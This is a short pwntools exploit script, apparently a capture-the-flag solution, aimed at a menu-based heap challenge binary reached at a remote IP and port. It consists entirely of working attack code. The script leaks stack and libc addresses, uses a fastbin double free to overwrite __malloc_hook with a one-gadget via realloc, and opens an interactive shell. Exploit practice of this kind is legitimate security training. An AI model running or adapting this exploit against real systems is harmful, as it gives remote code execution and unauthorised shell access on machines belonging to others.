from pwn import*
def menu(ch):
	p.sendlineafter('choise:',str(ch))
p = process('./main')
p = remote('183.129.189.61',56304)
libc =ELF('./libc-2.23.so')
p.sendafter("name:",(p64(0) + p64(0x31))*6)
p.recvuntil('tag: ')
stack = int(p.recv(14),16)
log.info("Stack:\t" + hex(stack))


###########
def new(idx,content):
	menu(1)
	p.sendlineafter('your id:',str(idx))
	p.sendafter('content',content)
def free(idx):
	menu(2)
	p.sendlineafter('your id:',str(idx))
def W(content):
	menu(3)
	p.send(content)

p.sendlineafter('choice:',"2")

W(p64(0) + p64(0x71) + p64(0)*2)
new(1,"FMYY")
new(2,"FMYY")
free(2)
free(1)
free(2)
new(3,p64(stack - 0x40))
new(4,"FMYY")
new(5,"FMYY")
new(6,"F"*0x44 + 'FMYY')
W("F"*0x20)
p.recvuntil("FMYY")
libc_base = u64(p.recv(6).ljust(8,'\x00')) - 240 - libc.sym['__libc_start_main']
log.info("LIBC:\t"+ hex(libc_base))
free(2)
free(1)
free(2)

rce = libc_base + 0x4527A
realloc = libc_base + libc.sym['realloc']
malloc_hook = libc_base + libc.sym['__malloc_hook']
new(7,p64(malloc_hook - 0x23))
new(8,"FMYY")
new(9,'FMYY')
new(10,'\x00'*(0x13 - 8) + p64(rce) + p64(realloc + 4))
free(1)
free(1)
p.interactive()
